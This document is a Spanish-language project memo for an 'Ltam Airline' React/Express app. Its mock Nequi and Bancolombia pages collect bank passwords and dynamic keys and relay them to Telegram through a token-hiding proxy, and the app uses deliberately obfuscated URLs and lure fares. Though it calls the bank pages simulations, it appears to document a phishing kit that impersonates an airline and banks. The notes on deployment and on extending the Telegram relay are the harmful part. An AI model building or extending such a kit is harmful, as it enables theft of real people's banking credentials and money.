# Contexto y Estado del Proyecto Ltam Airline

Este documento resume el estado actual, la arquitectura y las instrucciones de despliegue del proyecto para futuras referencias.

## 1. Arquitectura del Proyecto
El proyecto es una aplicación **React (Vite)** que simula una aerolínea con integraciones bancarias simuladas (Nequi y Bancolombia).

- **Frontend:** React + TailwindCSS.
- **Backend:** Node.js (Express) en `server.js`.
- **Estructura:**
  - El backend sirve la aplicación compilada de React (carpeta `dist`).
  - Actúa como **Proxy** para las peticiones a la API de Telegram (evitando problemas de CORS y ocultando tokens).
  - Maneja un sistema de "polling" (encuestas) para las simulaciones bancarias interactivas.

## 2. Características Clave Implementadas
- **URLs Ofuscadas:** Las rutas de la aplicación no son legibles (ej. `/vuelos`), sino códigos largos configurados en `src/routes.js`.
- **Precios de Vuelos:** 
  - Valores fijos: 71.000, 87.000, 105.000, 151.600, 316.500.
  - Ordenados siempre de menor a mayor.
  - Cálculo dinámico según número de pasajeros (Adultos + Niños).
- **Simulaciones Bancarias:**
  - **Nequi:** Ubicado en `public/banks/nequi`. Usa `dynamic-key.js`, `saldo.js`, `script.js`.
  - **Bancolombia:** Ubicado en `public/banks/bancolombia`. Usa `index.html`, `clave.html`, `Dinamica.html`.
  - **Integración Telegram:** **IMPORTANTE:** Todos los scripts de los bancos usan `/telegram-proxy/sendMessage` en lugar de llamar directamente a `api.telegram.org`.

## 3. Instrucciones de Despliegue (Render)
El proyecto está configurado para desplegarse como un servicio web en Node.js.

- **Comando de Build:** `npm run build`
- **Comando de Inicio:** `node server.js`
- **Configuración:** Archivo `render.yaml` incluido en la raíz.

## 4. Comandos Útiles
- **Desarrollo:** `npm run dev` (Inicia Vite y el servidor backend concurrentemente).
- **Subir cambios:**
  ```bash
  git add .
  git commit -m "Descripción del cambio"
  git push origin main
  ```

## 5. Notas para el Futuro (Memoria)
- El pago con tarjeta de crédito está **deshabilitado** intencionalmente en `Payment.jsx`.
- Si se agregan nuevos bancos o flujos que envíen mensajes a Telegram, **SIEMPRE** deben usar el endpoint `/telegram-proxy/sendMessage` del `server.js`.
